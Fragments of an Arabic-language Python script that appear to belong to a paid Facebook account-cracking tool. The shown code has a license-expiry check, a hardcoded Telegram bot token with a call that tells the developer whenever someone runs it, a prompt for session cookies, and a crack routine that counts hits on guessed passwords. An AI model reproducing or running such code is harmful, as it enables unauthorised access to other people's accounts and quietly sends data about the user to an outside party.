...
g= datetime.datetime(2023, 12,28 , 12, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+' انتهئ التفعيل انضم للقناه للحصول ع احدث نسخه سبيد المطور🖤') 
 print('\n\n')
 print(x)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+' انتهت الصلاحيه عليك بمراسلت المطور  يفعلك  سبيد المطور🖤') 
    print('\n\n')
    print(x)
...
token='6714460666:AAEyz-DuK6v6ybU8dLQ4yqtgClBfp1SXLt0'
print('')
ID=input(f'{G}I{B}D {R}: '+F)
ID='5825667865'
SAJAD = '\n𝚆𝙴𝙻𝙲𝙾𝙼𝙴 -مرحب بك في اداة المطور ســبــيــد \n𓅃━━━━━━━━❖━━━━━━━━━𓅃\n𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃  ➩ \nتم تشغيل الاداة المدفوعه\n    المطور  قناة https://t.me/apssss3\n   تـنسى ان تـرسل صـور الـصيد -  @S_B_E_D_M_A_X\n\n𓅃━━━━━━━━❖━━━━━━━━━𓅃 '
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(SAJAD))
os.system('clear')
SAJAD = f'''هلا عمو ســبــيــد شخص شغل الاداة \nالايدي تبعه tg://openmessage?user_id={ID}'''
od = '6603855963'
...
{B}« {C}سبيد تاج راسك  {B}»
{P}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━{P}┓    
{B}┃{C} ⌯ Telegram {B}› {C} يوزري By @Y_O_B8 {B} 	┃
{P}┗{B}━━━━━━━━━━━━━━━━━━━━━━━━━━{P}┛   
""")
...
def login_lagi334():
	banner()
	try:
		cookie=input("%s [C] ضع كوكيز : %s"%(K,H))
		...
		xox('\n تم تسجيل دخول كوكيز ✓ :)');time.sleep(2)
...
def main():
	...
	gh = 'h'
	print('\033[1;33m ~~~~~~~~~~~~~~~~~~~~~~~')
	print('» 1- Crack File : مــن مــلــف ✔️ ')	
	print('\033[1;33m ~~~~~~~~~~~~~~~~~~~~~~~')	
	print('» 0- login out : تسجيل خروج  ❌ ')
	print('')	
	_____alvino__adijaya_____ = input('\n>> اختار : : ')
	if _____alvino__adijaya_____ in ['33']:
		dump_massal()
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [سبيد مطور] %s/%s •‿- [OK] %s •‿- [CP] %s •‿- %s%s%s'%  (bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
